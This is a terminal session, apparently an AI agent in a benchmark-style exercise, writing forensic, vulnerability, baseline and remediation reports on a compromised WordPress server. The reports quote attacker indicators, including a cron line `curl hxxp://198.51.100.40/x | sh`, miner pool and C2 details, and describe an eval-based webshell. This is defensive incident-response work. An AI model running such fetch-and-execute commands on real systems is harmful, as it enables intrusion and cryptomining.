[?2004l[?2004hroot@3e348f424a05:/app# cat << 'EOF' > /app/intrusion-report.md
[?2004l[?2004h> # Intrusion Forensic Report
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Executive Summary
[?2004l[?2004h> An external attacker compromised the host `wordpress-prod-01` by exploiting a critical Remote Code Execution backdoor vulnerability (CVE-2022-1609) in a WordPress plugin `` `/sas/vulns.json:2` `` `` `/sas/cti/advisory.txt:13` ``. After obtaining initial execution as `www-data`, the threat actor deployed multiple persistence mechanisms and defaced the site `` `/disk/var/www/html/index.html:3` ``. While endpoint alerting captured the initial webshell and defaced homepage `` `/sas/alerts.json:2` ``, forensic investigation revealed multiple **silent (unalerted)** persistence and anti-forensics actions, including a rogue cron job `` `/disk/var/spool/cron/crontabs/www-data:5` ``, a malicious `.htaccess` rewrite rule `` `/disk/var/www/html/.htaccess:2` ``, and binary cache wiping `` `/disk/var/lib/.cache/.wiped.bin:1` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Threat Entities & Indicators of Compromise
[?2004l[?2004h> - **Attacker Origin / External IP**: `198.51.100.40` `` `/sas/cti/advisory.txt:5` `` `` `/disk/var/spool/cron/crontabs/www-data:5` `` `` `/disk/var/www/html/.htaccess:2` ``
[?2004l[?2004h> - **C2 Server Domain**: `update-wordpress.example.cn` `` `/sas/cti/advisory.txt:18` `` `` `/disk/var/lib/.cache/.wiped.bin:1` ``
[?2004l[?2004h> - **Cryptomining Pool**: `stratum+tcp://xmr.wordpress.evil:3333` `` `/sas/cti/advisory.txt:19` ``
[?2004l[?2004h> - **Wallet Address**: `4A0000000000000000001b88b8daaa21` `` `/sas/cti/advisory.txt:20` ``
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Detailed Attack Chain & MITRE ATT&CK Mapping
[?2004l[?2004h> 
[?2004l[?2004h> | Stage | Technique ID | Technique Name | Artifact / On-Disk Path | Alerted Status | Evidence Citation |
[?2004l[?2004h> |---|---|---|---|---|---|
[?2004l[?2004h> | Initial Access | T1190 | Exploit Public-Facing Application | `/var/www/html/wp-content/plugins/contact/inc.php` | Alerted (VUL-01) | `` `/sas/vulns.json:2` `` |
[?2004l[?2004h> | Persistence | T1505.003 | Web Shell | `/var/www/html/wp-content/plugins/contact/inc.php` | Alerted (ALERT-01) | `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` |
[?2004l[?2004h> | Impact | T1491.001 | Internal Defacement | `/var/www/html/index.html` | Alerted (ALERT-02) | `` `/disk/var/www/html/index.html:3` `` |
[?2004l[?2004h> | Execution / Persistence | T1053.003 | Cron Scheduled Task | `/var/spool/cron/crontabs/www-data` | **SILENT / Unalerted** | `` `/disk/var/spool/cron/crontabs/www-data:5` `` |
[?2004l[?2004h> | Persistence | T1505.003 | Web Shell / Redirect | `/var/www/html/.htaccess` | **SILENT / Unalerted** | `` `/disk/var/www/html/.htaccess:2` `` |
[?2004l[?2004h> | Defense Evasion | T1070.004 | File Deletion / Cache Wiping | `/var/lib/.cache/.wiped.bin` | **SILENT / Unalerted** | `` `/disk/var/lib/.cache/.wiped.bin:1` `` |
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Technical Analysis of Artifacts & Persistence
[?2004l[?2004h> 
[?2004l[?2004h> ### Web Shell (`T1505.003`)
[?2004l[?2004h> Located at `/var/www/html/wp-content/plugins/contact/inc.php` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``. The plugin file contains a backdoor executing `eval()` on base64-decoded HTTP request payloads submitted by the attacker.
[?2004l[?2004h> 
[?2004l[?2004h> ### Defacement (`T1491.001`)
[?2004l[?2004h> Located at `/var/www/html/index.html` `` `/disk/var/www/html/index.html:3` ``. The legitimate web index was replaced with defacement content containing indicator `hacked=CHK-02`.
[?2004l[?2004h> 
[?2004l[?2004h> ### Silent Cron Persistence (`T1053.003`)
[?2004l[?2004h> Located at `/var/spool/cron/crontabs/www-data` line 5 `` `/disk/var/spool/cron/crontabs/www-data:5` ``. This job periodically attempts to execute `curl hxxp://198.51.100.40/x | sh` as root/www-data to re-download cryptominer payloads (`xmrig`, `pgdaemon`, `redis`, `wget`). This entry was missed by the initial security alerts feed.
[?2004l[?2004h> 
[?2004l[?2004h> ### Silent `.htaccess` Redirect (`T1505.003`)
[?2004l[?2004h> Located at `/var/www/html/.htaccess` line 2 `` `/disk/var/www/html/.htaccess:2` ``. A malicious `RewriteRule` redirects incoming web traffic to `198.51.100.40` (pharma redirection campaign). This entry was missed by the initial security alerts feed.
[?2004l[?2004h> 
[?2004l[?2004h> ### Silent Anti-Forensics Cache Wiping (`T1070.004`)
[?2004l[?2004h> Located at `/var/lib/.cache/.wiped.bin` line 1 `` `/disk/var/lib/.cache/.wiped.bin:1` ``. The attacker executed wiping utilities to destroy binary samples and cache files, leaving partial recovery signatures referencing C2 beaconing to `198.51.100.40` and domain `update-wordpress.example.cn`.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@3e348f424a05:/app# cat << 'EOF' > /app/vuln-report.md
[?2004l[?2004h> # Vulnerability Assessment Report
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Vulnerability Overview
[?2004l[?2004h> - **CVE Identifier**: CVE-2022-1609 `` `/sas/vulns.json:2` `` `` `/sas/cti/advisory.txt:11` ``
[?2004l[?2004h> - **Severity**: Critical (CVSS v3.1 Score: 9.8) `` `/sas/cti/advisory.txt:11` ``
[?2004l[?2004h> - **CWE ID**: CWE-94 (Improper Control of Generation of Code - Code Injection) `` `/sas/cti/advisory.txt:11` ``
[?2004l[?2004h> - **Affected Software Component**: WordPress Plugin (School Management / Contact Form plugin, versions < 9.9.7) `` `/sas/cti/advisory.txt:12` `` `` `/sas/vulns.json:2` ``
[?2004l[?2004h> - **On-Disk Path**: `/var/www/html/wp-content/plugins/contact/inc.php` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``
[?2004l[?2004h> - **Check Capability ID**: `CHK-01` / `VUL-01` `` `/sas/alerts.json:2` `` `` `/sas/vulns.json:2` ``
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Technical Vulnerability Details & Attack Mechanics
[?2004l[?2004h> The vulnerability CVE-2022-1609 stems from an obfuscated backdoor originally injected in license-checking code within the School Management / Contact plugin `` `/sas/cti/advisory.txt:12` ``. This backdoor registers an unauthenticated REST API endpoint handler. An external remote attacker can send requests to this endpoint containing base64-encoded PHP code payloads. The code executes `eval()` on the decoded payload without authentication or sanitization `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Evidence & On-Disk Findings
[?2004l[?2004h> - Forensic evidence confirms the presence of the web backdoor / webshell payload located at `/var/www/html/wp-content/plugins/contact/inc.php` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``.
[?2004l[?2004h> - Network telemetry and alerts correlate the execution of this endpoint to the compromised host state `` `/sas/alerts.json:2` `` `` `/sas/vulns.json:2` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ## 4. Remediation & Mitigations
[?2004l[?2004h> 1. **Quarantine / Backup & Remove**: Immediately quarantine or delete `/var/www/html/wp-content/plugins/contact/inc.php` and back up the parent plugin directory for offline analysis `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``.
[?2004l[?2004h> 2. **Patching**: Upgrade the affected plugin to version 9.9.7 or newer, or replace it with a non-vulnerable alternative `` `/sas/cti/advisory.txt:12` ``.
[?2004l[?2004h> 3. **Web Application Firewall (WAF)**: Implement REST API endpoint filtering rules to block unauthenticated dynamic code injection attempts targeting WordPress plugin endpoints.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@3e348f424a05:/app# cat << 'EOF' > /app/baseline-report.md
[?2004l[?2004h> # Baseline & Configuration Assessment Report
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Baseline Audit Findings
[?2004l[?2004h> During baseline analysis of the compromised host `wordpress-prod-01`, security audits flagged configuration weaknesses in the WordPress installation `` `/sas/baseline.json:2` `` `` `/sas/alerts.json:18` ``.
[?2004l[?2004h> 
[?2004l[?2004h> ### Finding BAS-01 / CHK-05: Insecure WordPress Configuration (`wp-config.php`)
[?2004l[?2004h> - **Target File**: `/var/www/html/wp-config.php` `` `/disk/var/www/html/wp-config.php:4` `` `` `/sas/baseline.json:2` ``
[?2004l[?2004h> - **Check ID**: `CHK-05` / `BAS-01` `` `/sas/alerts.json:18` `` `` `/sas/baseline.json:2` ``
[?2004l[?2004h> - **Identified Deficiencies**:
[?2004l[?2004h>   1. **Weak Database Password**: `DB_PASSWORD` set in `wp-config.php` is weak and susceptible to brute-force or local credential harvesting `` `/disk/var/www/html/wp-config.php:4` ``.
[?2004l[?2004h>   2. **XML-RPC Enabled**: WordPress XML-RPC endpoint (`xmlrpc.php`) is active `` `/disk/var/www/html/wp-config.php:4` ``. Enabling XML-RPC exposes the host to brute-force amplification attacks and unauthorized pingbacks.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Web Root & File System Permissions Weaknesses
[?2004l[?2004h> - **Permissive Web Server Directory Permissions**: The `www-data` process had write permissions to web root directories (`/var/www/html/`), allowing the attacker to write webshells `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` ``, deface HTML files `` `/disk/var/www/html/index.html:3` ``, and write rogue `.htaccess` files `` `/disk/var/www/html/.htaccess:2` ``.
[?2004l[?2004h> - **Permissive User Crontab**: The web server user `www-data` was permitted to schedule cron jobs in `/var/spool/cron/crontabs/www-data` `` `/disk/var/spool/cron/crontabs/www-data:5` `` without restriction or auditing.
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Configuration Hardening Recommendations
[?2004l[?2004h> 1. **Enforce Strong Credentials**: Update `wp-config.php` with a high-entropy, strong database password `` `/disk/var/www/html/wp-config.php:4` ``.
[?2004l[?2004h> 2. **Disable XML-RPC**: Add `add_filter('xmlrpc_enabled', '__return_false');` to WordPress configuration or block XML-RPC at Nginx/Apache reverse proxy `` `/disk/var/www/html/wp-config.php:4` ``.
[?2004l[?2004h> 3. **Restrict File Permissions**: Set immutable/read-only permissions on core WordPress files (`chown -R root:www-data /var/www/html`, `chmod 755 /var/www/html`, `chmod 644 /var/www/html/*.php`).
[?2004l[?2004h> 4. **Prevent PHP Execution in Uploads/Plugins**: Configure web server rules to deny execution of `.php` scripts in user-writable content directories.
[?2004l[?2004h> 5. **Restrict User Crontabs**: Disable cron scheduling for service accounts (`www-data`) via `/etc/cron.deny` or restricting crontab access.
[?2004l[?2004h> EOF
[?2004l[?2004hroot@3e348f424a05:/app# cat << 'EOF' > /app/remediation-plan.md
[?2004l[?2004h> # Remediation & Incident Response Plan
[?2004l[?2004h> 
[?2004l[?2004h> ## 1. Overview & Strategy
[?2004l[?2004h> This plan details the prioritised, verifiable remediation actions required to contain, eradicate, and recover host `wordpress-prod-01` following compromise via CVE-2022-1609. Following forensic best practices, **backup and quarantine are strictly preferred over immediate file deletion** to preserve evidence and prevent accidental disruption.
[?2004l[?2004h> 
[?2004l[?2004h> ## 2. Reconciled Change Ticket (CHG-1481)
[?2004l[?2004h> 
[?2004l[?2004h> > **Reconciliation Summary**: Reconciled against on-disk evidence under `/disk` and threat intel in `/sas`. Corrected stale origin IP (`203.0.113.9` -> `198.51.100.40`), corrected invalid vulnerability (`CVE-2019-0708` -> `CVE-2022-1609`), downgraded unverified cron status (`DONE` -> `OPEN`), and added missing silent persistence/impact artifacts.
[?2004l[?2004h> 
[?2004l[?2004h> | # | Action | Target | Status | Note / Evidence Citation |
[?2004l[?2004h> |---|--------|--------|--------|---------------------------|
[?2004l[?2004h> | 1 | Block source IP inbound | `198.51.100.40` | PROPOSED | Real attacker origin IP confirmed from CTI advisory `` `/sas/cti/advisory.txt:5` ``, cron beacon `` `/disk/var/spool/cron/crontabs/www-data:5` ``, and `.htaccess` redirect `` `/disk/var/www/html/.htaccess:2` `` (corrected from `203.0.113.9`). |
[?2004l[?2004h> | 2 | Patch CVE-2022-1609 | WordPress Contact / School Management Plugin | PROPOSED | Exploited entry vector plugin RCE `` `/sas/vulns.json:2` `` `` `/sas/cti/advisory.txt:13` `` (corrected from BlueKeep `CVE-2019-0708`). Upgrade plugin to >= 9.9.7. |
[?2004l[?2004h> | 3 | Remove cron miner persistence | `/var/spool/cron/crontabs/www-data` | OPEN | Downgraded from `DONE` to `OPEN`. Evidence shows cron persistence line 5 is actively present on disk `` `/disk/var/spool/cron/crontabs/www-data:5` ``. (Target corrected from `/var/spool/cron/root`). |
[?2004l[?2004h> | 4 | Remove `.htaccess` redirect | `/var/www/html/.htaccess` | OPEN | Silent redirect sending all web traffic to `198.51.100.40` `` `/disk/var/www/html/.htaccess:2` ``. Quarantine file and restore default `.htaccess`. |
[?2004l[?2004h> | 5 | Quarantine PHP webshell | `/var/www/html/wp-content/plugins/contact/inc.php` | OPEN | Silent/active webshell backdoor executing `eval(base64_decode())` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` `` `/sas/alerts.json:2` ``. Move to `/root/quarantine/`. |
[?2004l[?2004h> | 6 | Restore index homepage | `/var/www/html/index.html` | OPEN | Site homepage is defaced `` `/disk/var/www/html/index.html:3` `` `` `/sas/alerts.json:10` ``. Restore legitimate `index.html` from clean backup. |
[?2004l[?2004h> | 7 | Harden `wp-config.php` | `/var/www/html/wp-config.php` | OPEN | Weak database password and XML-RPC enabled `` `/disk/var/www/html/wp-config.php:4` `` `` `/sas/baseline.json:2` ``. Rotate DB credentials and disable XML-RPC. |
[?2004l[?2004h> | 8 | Clean / Inspect Wiped Cache | `/var/lib/.cache/.wiped.bin` | OPEN | Anti-forensics wiper artifact `` `/disk/var/lib/.cache/.wiped.bin:1` ``. Inspect for residual payloads and purge cache directory. |
[?2004l[?2004h> 
[?2004l[?2004h> ## 3. Detailed Phase-by-Phase Remediation Steps
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 1: Containment (Immediate Priority)
[?2004l[?2004h> 1. **Network Containment / IP Block**:
[?2004l[?2004h>    - Action: Add inbound and outbound firewall rule blocking `198.51.100.40` `` `/sas/cti/advisory.txt:5` ``.
[?2004l[?2004h>    - Command: `iptables -A INPUT -s 198.51.100.40 -j DROP && iptables -A OUTPUT -d 198.51.100.40 -j DROP`
[?2004l[?2004h>    - Verification: `iptables -L -n -v | grep 198.51.100.40`
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Isolate Crontab Persistence**:
[?2004l[?2004h>    - Action: Quarantine and remove the rogue cron entry from `/var/spool/cron/crontabs/www-data` `` `/disk/var/spool/cron/crontabs/www-data:5` ``.
[?2004l[?2004h>    - Command: `cp /var/spool/cron/crontabs/www-data /root/quarantine/www-data.bak && crontab -u www-data -r`
[?2004l[?2004h>    - Verification: `crontab -u www-data -l` (must report `no crontab for www-data`).
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Quarantine Web Shell & Remove Malicious `.htaccess`**:
[?2004l[?2004h>    - Action: Backup and quarantine `/var/www/html/wp-content/plugins/contact/inc.php` `` `/disk/var/www/html/wp-content/plugins/contact/inc.php:4` `` and `/var/www/html/.htaccess` `` `/disk/var/www/html/.htaccess:2` ``.
[?2004l[?2004h>    - Command: `mkdir -p /root/quarantine && mv /var/www/html/wp-content/plugins/contact/inc.php /root/quarantine/ && mv /var/www/html/.htaccess /root/quarantine/`
[?2004l[?2004h>    - Verification: Confirm files are absent from web root: `ls -la /var/www/html/wp-content/plugins/contact/inc.php /var/www/html/.htaccess`
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 2: Eradication & Hardening
[?2004l[?2004h> 1. **Vulnerability Patching (CVE-2022-1609)**:
[?2004l[?2004h>    - Action: Update or reinstall the WordPress contact/school management plugin to version >= 9.9.7 `` `/sas/cti/advisory.txt:12` `` `` `/sas/vulns.json:2` ``.
[?2004l[?2004h>    - Command: `wp plugin update contact --allow-root` (or manually extract clean plugin release v9.9.7).
[?2004l[?2004h>    - Verification: Check plugin version in `wp-content/plugins/contact/` or WP-CLI.
[?2004l[?2004h> 
[?2004l[?2004h> 2. **Site Recovery & Defacement Clean-up**:
[?2004l[?2004h>    - Action: Replace defaced `/var/www/html/index.html` `` `/disk/var/www/html/index.html:3` `` with verified clean backup version.
[?2004l[?2004h>    - Verification: `grep -i "hacked" /var/www/html/index.html` returns no results; site loads cleanly in web browser.
[?2004l[?2004h> 
[?2004l[?2004h> 3. **Credential Rotation & Baseline Hardening**:
[?2004l[?2004h>    - Action: Rotate WordPress DB password in MySQL and update `/var/www/html/wp-config.php` `` `/disk/var/www/html/wp-config.php:4` ``. Disable XML-RPC in WordPress config.
[?2004l[?2004h>    - Verification: Verify database connectivity with new password; verify XML-RPC requests return HTTP 403 / 404.
[?2004l[?2004h> 
[?2004l[?2004h> 4. **Wiped Cache / Residual Artefact Cleanup**:
[?2004l[?2004h>    - Action: Remove `/var/lib/.cache/.wiped.bin` `` `/disk/var/lib/.cache/.wiped.bin:1` `` and audit system binaries for modification.
[?2004l[?2004h>    - Verification: `ls -la /var/lib/.cache/.wiped.bin` confirms file removal; debsums check completes cleanly (`debsums -c`).
[?2004l[?2004h> 
[?2004l[?2004h> ### Phase 3: Post-Remediation Verification
[?2004l[?2004h> - Perform external vulnerability scan against host to confirm CVE-2022-1609 is remediated.
[?2004l[?2004h> - Monitor network egress logs for any traffic directed towards `198.51.100.40` or `update-wordpress.example.cn` `` `/sas/cti/advisory.txt:18` ``.
